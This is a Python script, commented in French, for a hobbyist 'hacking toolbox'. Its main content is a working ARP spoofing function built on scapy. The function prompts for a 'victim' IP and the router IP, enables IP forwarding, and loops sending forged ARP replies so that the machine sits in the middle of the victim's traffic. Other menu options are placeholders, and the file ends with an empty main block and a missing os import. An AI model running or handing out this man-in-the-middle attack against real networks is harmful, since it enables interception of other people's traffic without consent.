import scapy.all as scapy
from scapy import *
import time # on importe la librairie time permettant de mettre des pauses entre chaque envoient de paquets.
import argparse # on importe la librairie argparse permettant d'ajouter des arguments très simplement.
import sys # on importe la librairie sys pour permettre des impressions dynamiques


#---------------------------------------------------------

# Création de notre interface menu

#---------------------------------------------------------


print("""   _____                           __  __                      _   _           
  / ____|                         |  \/  |                    | | (_)           
 | |     __ _  ___  ___  __ _ _ __| \  / | __ ___  _____ _ __ | |_ _ _   _ ___  
 | |    / _` |/ _ \/ __|/ _` | '__| |\/| |/ _` \ \/ / _ \ '_ \| __| | | | / __| 
 | |___| (_| |  __/\__ \ (_| | |  | |  | | (_| |>  <  __/ | | | |_| | |_| \__ \ 
  \_____\__,_|\___||___/\__,_|_|  |_|  |_|\__,_/_/\_\___|_| |_|\__|_|\__,_|___/ 
                                                                                \n
                                                                                \n """)


# Création de ma fonction main étant le principal menu de ma boîte à outil
def main():
	while True : # Boucle pour revenir aux demandes au cas ou l'utilisateur n'intérargi pas avec une fonction
		n = input("1- Network Scanner\n2- ARP Spoofing\n3- Exploit\n4- Quitter\n\nEntrez un nombre : ") # Création des choix du menu
		if n == '1': # boucle qui renvoie à un print si l'utilisateur choisi 1
			print("***********************************************************************") 
			print("En cours de construction")
			print("***********************************************************************") 
            
		elif n == '2': # boucle qui va renvoyer l'utilisateur à la fonction si il choisit 2
			arpspoof()
            
		elif n == '3':# boucle qui renvoie à un print si l'utilisateur choisi 3
			print("***********************************************************************") 
			print("En cours de construction")
			print("***********************************************************************") 
            
		elif n == '4':# boucle qui renvoie à un print si l'utilisateur choisi 4 et ferme le programme
			print( 
"\n   _____    ___.   .__               __          __   "
"\n  /  _  \   \_ |__ |__| ____   _____/  |_  _____/  |_ "
"\n /  /_\  \   | __ \|  |/ __ \ /    \   __\/  _ \   __\""
"\n/    |    \  | \_\ \  \  ___/|   |  \  | (  <_> )  |  "
"\n\____|__  /  |___  /__|\___  >___|  /__|  \____/|__|  "
"\n        \/       \/        \/     \/                  "
)
			break
            
		else: # boucle qui renvoie à un print si l'utilisateur choisi un nombre inexistant du menu
			print("***********************************************************************") 
			print("Cette option est inexistante")
			print("***********************************************************************") 


#---------------------------------------------------------

# Fin du menu

#---------------------------------------------------------

# Fonction principale permettant de faire fonctionner tout le programme
def arpspoof():    
    # Message de bienvenue
	print("***********************************************************************")  
	print("**********Bienvenue sur le ARP Spoofer de CaesarMaxentius**************")
	print("***********************************************************************")   
    # Définition de mes fonctions dynamiques permettant à l'utilisateur d'entrer lui-même ses charactères
	target_ip = input("Entrez l'adresse IP de la victime : ") # On défini la fonction targetIP qui sera l'IP de la victime
	gateway_ip = input("Entrez l'adresse IP du routeur : ")
    
	print("\n"
	"##::::::::::'###::::'##::: ##::'######::'########:'##::::'##:'########:'##::: ##:'########::::\n"
	"##:::::::::'## ##::: ###:: ##:'##... ##: ##.....:: ###::'###: ##.....:: ###:: ##:... ##..:::::\n"
	"##::::::::'##:. ##:: ####: ##: ##:::..:: ##::::::: ####'####: ##::::::: ####: ##:::: ##:::::::\n"
	"##:::::::'##:::. ##: ## ## ##: ##::::::: ######::: ## ### ##: ######::: ## ## ##:::: ##:::::::\n"
	"##::::::: #########: ##. ####: ##::::::: ##...:::: ##. #: ##: ##...:::: ##. ####:::: ##:::::::\n"
	"##::::::: ##.... ##: ##:. ###: ##::: ##: ##::::::: ##:.:: ##: ##::::::: ##:. ###:::: ##:::::::\n"
	"########: ##:::: ##: ##::. ##:. ######:: ########: ##:::: ##: ########: ##::. ##:::: ##:::::::\n"
	"........::..:::::..::..::::..:::......:::........::..:::::..::........::..::::..:::::..:::::::\n"
	)
#---------------------------------------------------------    
# Les fonctions ci-dessous ne fonctionnent que sur Linux, en l'occurence, j'ai utilisé Kali Linux.
# En effet, sur windows ces commandes ne nous permettent pas de toucher aux fichiers permettant le routage des paquets
# Nous devrons donc utiliser notre programme sur Kali ou Ubuntu.
# Mais bon, un vrai hacker est sur Kali Linux n'est-ce pas ?
#---------------------------------------------------------
# Création de ma fonction routage (lancer en sudo car nous touchons à des fichiers sensibles)
	def activation_routage():
		print("\n[*] Caesar HACKING : Activation du routage... Redirection des Paquets...\n")
		os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")#Permettre le IP forwarding qui est le procédé de routage internet.
        # Cela permet de déterminer la direction du réseau ou les paquets IP peuvent être envoyés (routage IP)
            
	def désactivation_routage():
		print("\n[*] Caesar HACKING : Désactivation du routage...\n")
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")# Désactiver le IP forwarfing  
#---------------------------------------------------------
    
    
#---------------------------------------------------------    
# Création de la fonction permettant de récupérer l'adresse MAC de la victime grâce à une requête ARP
	def get_mac(ip):
		arp_request = scapy.ARP(pdst = ip) # Quelle que soit l'adresse IP saisie, elle créera un arp_request avec la fonction ARP() correspondante à son IP
		broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff") # Création de la fonction broadcast qui aura comme fonction l'adresse de diffusion
		arp_request_broadcast = broadcast / arp_request  # Nous assemblons en un seul paquet les deux fonctions pour avoir notre demande ARP complète
		recherche_mac = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0] # Notre fonction srp renvoie 
# deux listes d'adresses IP qui ont répondu au paquet ainsi que les paquets qui n'ont pas répondu.
		return recherche_mac[0][1].hwsrc 
# L'adresse MAC qui a l'adresse IP correspondante à notre victime sera stockée dans le champs hwsrc.
# Nous renvoyons cette adresse MAC à l'endroit ou la fonction a été appelée.
#---------------------------------------------------------


# Création de notre fonction spoof permettant d'usurper l'identité de notre PC
	def spoof(target_ip, spoof_ip): # Prend en paramètre l'ip cible et l'ip d'usurpation
        # Création d'un paquet modifiant la table ARP de la passerelle et de notre cible.
		packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip),psrc = spoof_ip)
        # Envoie de la fonction via send() pour démarrer notre usurpation
		scapy.send(packet, verbose = False)

	def restore(destination_ip, source_ip): # Création de la fonction restore qui prendra comme argument l'ip destination et source
		destination_mac = get_mac(destination_ip) #Mac destination (celle de la victime)
		source_mac = get_mac(source_ip) # Notre Adresse Mac
		packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
# pdst = la ou le paquet doit aller, hwdst = adresse matérielle de destination (mac), psrc = adresse IP à mettre à jour dans la table arp de la cible
# hwsrc = MAC à mettre à jour dans la table arp de la cible psrc
		scapy.send(packet, verbose = False)

	try:
		activation_routage() # activer le routage des paquets sous linux
		sent_packets_count = 0 # variable pour compter nos paquets envoyés
		while True: # Boucle qui fonctionne à l'infini tant que nous n'interrompons pas la boucle
			spoof(target_ip, gateway_ip) # Activation du spoofing
			spoof(gateway_ip, target_ip)
			sent_packets_count = sent_packets_count + 2 # Envoyer 2 paquets par actualisation car nous faisons une pause de 2s soit 1paquet/s
			print("\n[*] Caesar HACKING : [+] Envoi de paquets "+str(sent_packets_count), end ="")
			time.sleep(2) # Attendre deux secondes
# Interrompre notre programme si l'utilisateur fais Ctrl+C et retourner au menu de notre outil
	except KeyboardInterrupt:
		print("\n")  
		print("\n******************************************************************************")  
		print("\nInterrompre le Spoof en faisant CTRL + C------------ Retour à l'état normal...")
		print("\n******************************************************************************") 
		restore(gateway_ip, target_ip) # Utilisation de nos fonctions restore permettant de tout remettre en ordre
		restore(target_ip, gateway_ip)
		désactivation_routage() # Désactivation du routage en appelant la fonction.
		print("\n*******************************************") 
		print("\n[+] Caesar HACKING : Arp Spoof s'est arrêté")
		print("\n[*] Caesar HACKING : Retour au menu")
		print("\n*******************************************") 

if __name__ == "__main__":
